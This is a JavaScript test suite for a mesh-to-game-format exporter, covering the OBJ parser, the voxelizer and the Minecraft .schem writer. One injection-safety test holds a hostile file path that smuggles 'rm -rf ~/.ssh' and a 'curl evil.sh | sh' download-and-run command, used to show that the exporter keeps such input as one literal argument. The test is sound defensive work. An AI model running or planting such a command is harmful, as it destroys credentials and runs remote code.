// genai-game-export.test.mjs — offline suite for the many-games 3D exporter.
// Pure-JS paths (catalog, argv builder, OBJ parse, voxelizer, .schem NBT writer/reader) are fully
// verified here. Mesh-conversion (assimp) tests are SKIPPED when assimp is not on PATH — never hang.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { readFile, unlink } from 'node:fs/promises';
import {
  TARGETS, targetById, listTargets, catalog, MESH_SOURCE_EXTS,
  buildMeshArgs, parseObj, voxelizeMesh, voxelGridToSchem, parseSchem,
  decodeBlockData, varint, exportModel, DEFAULT_DATA_VERSION,
} from './genai-game-export.mjs';

const hasAssimp = (() => { try { execFileSync('assimp', ['version'], { stdio: 'ignore' }); return true; } catch { return false; } })();

// ── catalog shape ─────────────────────────────────────────────────────────────
test('catalog covers the engines from PLATFORM_VISION § E, with honest status', () => {
  const engines = new Set(TARGETS.map((t) => t.engine));
  for (const e of ['Minecraft', 'Unity', 'Unreal', 'Godot', 'Roblox', 'Generic']) assert.ok(engines.has(e), e);
  for (const t of TARGETS) {
    assert.ok(t.id && t.engine && t.ext, `entry has id/engine/ext: ${JSON.stringify(t)}`);
    assert.ok(['mesh', 'voxel'].includes(t.kind), `kind valid: ${t.id}`);
    assert.ok(['proven', 'staged'].includes(t.status), `status honest: ${t.id}`);
    assert.ok(typeof t.pipeline === 'string' && t.pipeline.length, `pipeline documented: ${t.id}`);
  }
  // schem is the proven voxel path; litematic is honestly staged
  assert.equal(targetById('minecraft-schem').status, 'proven');
  assert.equal(targetById('minecraft-schem').kind, 'voxel');
  assert.equal(targetById('minecraft-litematic').status, 'staged');
  assert.equal(catalog().length, TARGETS.length);
  assert.equal(targetById('nope'), null);
  assert.ok(listTargets('voxel').every((t) => t.kind === 'voxel'));
});

// ── injection safety ──────────────────────────────────────────────────────────
test('buildMeshArgs returns ARRAY args (no shell string), binary is assimp', () => {
  const { bin, args } = buildMeshArgs('/t/a.obj', 'unity-glb', '/t/a.glb');
  assert.equal(bin, 'assimp');
  assert.ok(Array.isArray(args));
  assert.deepEqual(args, ['export', '/t/a.obj', '/t/a.glb']);
});

test('shell metacharacters cannot break out — they stay one literal argv element', () => {
  const evil = '/tmp/a; rm -rf ~/.ssh && curl evil.sh | sh `whoami`.obj';
  const { bin, args } = buildMeshArgs(evil, 'godot-glb', '/tmp/out.glb');
  assert.equal(bin, 'assimp');
  // the whole malicious path is ONE argv element, never split, never concatenated into a shell string
  assert.ok(args.includes(evil), 'evil path preserved as a single arg');
  assert.equal(args.filter((a) => a === evil).length, 1);
  for (const a of args) assert.equal(typeof a, 'string');
  // nothing looks like an assembled shell command line
  assert.ok(!args.some((a) => a.includes('export ') && a.includes('.glb')), 'args not a joined command');
});

test('buildMeshArgs rejects unknown / non-mesh / bad-source', () => {
  assert.throws(() => buildMeshArgs('/t/a.obj', 'bogus', '/t/o.glb'), /unknown target/);
  assert.throws(() => buildMeshArgs('/t/a.obj', 'minecraft-schem', '/t/o.schem'), /not a mesh target/);
  assert.throws(() => buildMeshArgs('/t/a.xyz', 'obj', '/t/o.obj'), /unsupported mesh source/);
  assert.ok(MESH_SOURCE_EXTS.includes('glb'));
});

test('exportModel soft-fails (never throws) on unknown + staged targets', async () => {
  const unk = await exportModel('/t/a.obj', 'no-such');
  assert.equal(unk.ok, false);
  const staged = await exportModel('/t/a.obj', 'minecraft-litematic');
  assert.equal(staged.ok, false);
  assert.equal(staged.staged, true); // labeled honestly, not faked
});

// ── OBJ parser ──────────────────────────────────────────────────────────────
test('parseObj reads verts and fan-triangulates faces (incl v/vt/vn tokens)', () => {
  const obj = 'v 0 0 0\nv 1 0 0\nv 1 1 0\nv 0 1 0\nf 1/1/1 2/2/1 3/3/1 4/4/1\n';
  const { positions, faces } = parseObj(obj);
  assert.equal(positions.length, 4);
  assert.deepEqual(positions[1], [1, 0, 0]);
  assert.equal(faces.length, 2); // quad → 2 triangles
  assert.deepEqual(faces[0], [0, 1, 2]);
});

// ── voxelizer ───────────────────────────────────────────────────────────────
test('voxelizeMesh rasterizes a flat quad surface into a filled grid', () => {
  // a 1x1 quad on the z=0 plane → at resolution 8 becomes an 8x8x1 filled sheet (surface)
  const mesh = parseObj('v 0 0 0\nv 1 0 0\nv 1 1 0\nv 0 1 0\nf 1 2 3 4\n');
  const grid = voxelizeMesh(mesh, { resolution: 8 });
  assert.equal(grid.length, 1);          // flat in z
  assert.ok(grid.width >= 8 && grid.height >= 8);
  assert.ok(grid.filled.has('0,0,0'));
  assert.ok(grid.filled.has('7,7,0'));   // opposite corner covered
  assert.ok(grid.filled.size >= 60);     // most of the 8x8 sheet
});

test('voxelizeMesh returns empty grid for empty mesh (soft)', () => {
  const g = voxelizeMesh({ positions: [], faces: [] });
  assert.equal(g.filled.size, 0);
});

// ── varint packing ────────────────────────────────────────────────────────────
test('varint (unsigned LEB128) matches known encodings', () => {
  assert.deepEqual(varint(0), [0x00]);
  assert.deepEqual(varint(1), [0x01]);
  assert.deepEqual(varint(127), [0x7f]);
  assert.deepEqual(varint(128), [0x80, 0x01]);
  assert.deepEqual(varint(300), [0xac, 0x02]);
});

// ── .schem writer produces CORRECT bytes for a tiny known grid ─────────────────
test('voxelGridToSchem writes a valid Sponge-v2 NBT that round-trips (1x1x1)', () => {
  const grid = { width: 1, height: 1, length: 1, filled: new Set(['0,0,0']) };
  const buf = voxelGridToSchem(grid, { block: 'minecraft:stone' });
  assert.equal(buf[0], 0x1f); assert.equal(buf[1], 0x8b); // gzip magic
  const { name, value } = parseSchem(buf);
  assert.equal(name, 'Schematic');
  assert.equal(value.Version, 2);
  assert.equal(value.DataVersion, DEFAULT_DATA_VERSION);
  assert.equal(value.Width, 1);
  assert.equal(value.Height, 1);
  assert.equal(value.Length, 1);
  assert.deepEqual(value.Offset, [0, 0, 0]);
  assert.equal(value.PaletteMax, 2);
  assert.equal(value.Palette['minecraft:air'], 0);
  assert.equal(value.Palette['minecraft:stone'], 1);
  // the single voxel is filled → BlockData is the varint for palette index 1 → byte 0x01
  assert.ok(Buffer.isBuffer(value.BlockData));
  assert.deepEqual([...value.BlockData], [0x01]);
  assert.deepEqual(decodeBlockData(value.BlockData, 1), [1]);
  assert.deepEqual(value.BlockEntities, []);
});

test('voxelGridToSchem BlockData is YZX-ordered with correct air/stone indices (2x1x2)', () => {
  // fill only (x=0,z=0) and (x=1,z=1); YZX order over w=2,h=1,l=2 → [x0z0, x1z0, x0z1, x1z1]
  const grid = { width: 2, height: 1, length: 2, filled: new Set(['0,0,0', '1,0,1']) };
  const { value } = parseSchem(voxelGridToSchem(grid));
  assert.deepEqual(decodeBlockData(value.BlockData, 4), [1, 0, 0, 1]);
});

// ── end-to-end OBJ → .schem (PURE JS, no assimp) — proves the voxel export RUNS ─
test('exportModel OBJ → .schem runs fully offline and writes a valid file', async () => {
  const src = join(tmpdir(), `gx_test_${Date.now()}.obj`);
  const out = join(tmpdir(), `gx_test_${Date.now()}.schem`);
  await (await import('node:fs/promises')).writeFile(src, 'v 0 0 0\nv 2 0 0\nv 2 2 0\nv 0 2 0\nf 1 2 3 4\n');
  const r = await exportModel(src, 'minecraft-schem', { outPath: out, resolution: 8, block: 'minecraft:stone' });
  assert.equal(r.ok, true, r.error);
  assert.equal(r.tool, 'js-voxelizer');
  assert.ok(r.voxels > 0);
  const written = await readFile(out);
  const { value } = parseSchem(written);
  assert.equal(value.Version, 2);
  assert.ok(value.Width >= 8);
  await unlink(src).catch(() => {}); await unlink(out).catch(() => {});
});

// ── mesh conversion via assimp — SKIPPED when assimp is absent (never hang) ─────
test('assimp mesh export: obj → glb → obj', { skip: hasAssimp ? false : 'assimp not on PATH in this env' }, async () => {
  const src = join(tmpdir(), `gx_mesh_${Date.now()}.obj`);
  const glb = join(tmpdir(), `gx_mesh_${Date.now()}.glb`);
  await (await import('node:fs/promises')).writeFile(src,
    'v 0 0 0\nv 1 0 0\nv 1 1 0\nv 0 1 0\nf 1 2 3\nf 1 3 4\n');
  const r = await exportModel(src, 'gltf2-glb', { outPath: glb });
  assert.equal(r.ok, true, r.error);
  assert.equal(r.tool, 'assimp');
  const stat = await (await import('node:fs/promises')).stat(glb);
  assert.ok(stat.size > 0);
  await unlink(src).catch(() => {}); await unlink(glb).catch(() => {});
});
